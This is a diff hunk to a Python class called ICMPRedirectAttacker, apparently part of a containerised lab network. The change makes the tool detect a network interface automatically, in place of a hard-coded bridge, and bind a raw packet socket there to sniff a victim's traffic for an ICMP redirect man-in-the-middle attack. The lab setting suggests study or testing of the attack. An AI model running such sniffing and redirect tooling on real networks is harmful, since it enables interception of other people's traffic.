@@ -18,14 +18,34 @@ class ICMPRedirectAttacker:
         self.running = False
         self.packet_crafter = PacketCrafter()
         
+    def get_network_interface(self):
+        """Get the network interface name dynamically"""
+        try:
+            import os
+            interfaces = os.listdir('/sys/class/net/')
+            # Look for eth interface (default in containers)
+            for iface in interfaces:
+                if iface.startswith('eth'):
+                    return iface
+            # Fallback to first non-loopback interface
+            for iface in interfaces:
+                if iface != 'lo':
+                    return iface
+            return 'eth0'  # Default fallback
+        except:
+            return 'eth0'
+
     def sniff_packets(self):
         """Sniff packets to detect victim's traffic to target"""
         try:
+            interface = self.get_network_interface()
+            print(f"[*] Using network interface: {interface}")
+            
             # Create raw socket for sniffing
             sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
-            sniffer.bind(("br-icmpnet", 0))  # Bind to bridge interface
+            sniffer.bind((interface, 0))  # Bind to detected interface
             
-            print(f"[*] Starting packet sniffing on bridge interface...")
+            print(f"[*] Starting packet sniffing on {interface}...")
             
             while self.running:
                 ready = select.select([sniffer], [], [], 1.0)
